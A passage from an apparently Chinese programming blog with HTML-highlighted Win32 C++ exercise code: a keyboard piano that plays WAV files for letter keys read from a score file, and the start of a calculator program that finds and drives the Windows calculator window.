class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Data</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//接收从本地读取到的字符</span></span><br><span class="line"><span class="type">char</span> <span class="type">static</span> Souce[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//判断传入的字符对应的播放音乐</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">If_Case</span><span class="params">(<span class="type">char</span> c_char)</span></span>;</span><br><span class="line"><span class="comment">//读取本地歌谱</span></span><br><span class="line"><span class="function">BOOL <span class="title">ReadData</span><span class="params">(HWND hwnd)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Data-cpp-数据类函数定义"><a href="#Data-cpp-数据类函数定义" class="headerlink" title="Data.cpp//数据类函数定义"></a>Data.cpp//数据类函数定义</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Data.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Data::Souce[<span class="number">50</span>] = &#123;&#125;;</span><br><span class="line"><span class="comment">//从本地读取歌谱</span></span><br><span class="line"><span class="function">BOOL <span class="title">Data::ReadData</span><span class="params">(HWND hwnd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FILE* file;</span><br><span class="line"><span class="comment">//如果打开成则为0</span></span><br><span class="line"><span class="type">int</span> Errno = <span class="built_in">fopen_s</span>(&amp;file, <span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (Errno != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hwnd, <span class="string">L&quot;错误&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fgets</span>(Souce,<span class="number">50</span>,file);</span><br><span class="line"><span class="comment">//关闭文件</span></span><br><span class="line"><span class="built_in">fclose</span>(file);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断字符对应所播放的音乐</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Data::If_Case</span><span class="params">(<span class="type">char</span> c_char)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (c_char)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_Q.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_W.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_E.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_R.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_T.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_Y.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;U&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_U.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_I.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_O.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;P&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_P.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_A.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_S.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_D.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_F.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_G.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;H&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_H.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;J&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_J.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;K&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_K.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_L.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_Z.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_X.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_C.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_V.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_B.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_N.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_M.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>:</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题：计算器"><a href="#题：计算器" class="headerlink" title="题：计算器"></a>题：计算器</h2><p>描述：自己编写一个计算器能够控制windows系统中的计算器进行操作</p><h3 id="main-cpp-主函数-1"><a href="#main-cpp-主函数-1" class="headerlink" title="main.cpp//主函数"></a>main.cpp//主函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WNDCLASS wc = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">wc.lpszClassName = <span class="string">L&quot;my_calc&quot;</span>;</span><br><span class="line">wc.lpfnWndProc = WndProc;</span><br><span class="line">wc.hbrBackground =(HBRUSH)COLOR_APPWORKSPACE;</span><br><span class="line"></span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;wc);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建窗口</span></span><br><span class="line">HWND hwnd=<span class="built_in">CreateWindow</span>(<span class="string">L&quot;my_calc&quot;</span>,<span class="string">L&quot;计算器&quot;</span>,WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,<span class="number">0</span>,<span class="number">390</span>,<span class="number">600</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,hInstance,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd, SW_NORMAL);</span><br><span class="line"><span class="built_in">UpdateWindow</span>(hwnd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息循环</span></span><br><span class="line">MSG msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"></span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//回调函数消息处理</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND calc = <span class="built_in">FindWindow</span>(<span class="string">L&quot;CalcFrame&quot;</span>, <span class="string">L&quot;计算器&quot;</span>);</span><br><span class="line"><span class="type">static</span> HINSTANCE hInstance = (HINSTANCE)<span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//HWND calc=FindWindow(NULL,L&quot;计算器&quot; );</span></span><br><span class="line"><span class="comment">//HWND calc = (HWND)0x00140596;</span></span><br><span class="line"><span class="keyword">switch</span> (msg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//SendMessage(calc, WM_COMMAND, MAKEWPARAM(0x83, BN_CLICKED), NULL);</span></span><br><span class="line"><span class="comment">//对话框</span></span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;edit&quot;</span>, <span class="string">L&quot; &quot;</span>, WS_CHILD | WS_VISIBLE | WS_BORDER, <span class="number">10</span>, <span class="number">10</span>, <span class="number">350</span>, <span class="number">180</span>, hwnd, (HMENU)<span class="number">0x1011</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//按键</span></span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;清空&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">200</span>, <span class="number">170</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1000</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;退格&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">200</span>, <span class="number">170</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1017</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;1&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1001</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;2&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1002</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;3&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1003</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;4&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">100</span>, <span class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1004</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;5&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">100</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1005</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;6&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">100</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1006</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;7&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1007</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;8&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1008</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;9&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1009</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;0&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">440</span>, <span class="number">170</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x0011</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;.&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">440</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10012</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;+&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span 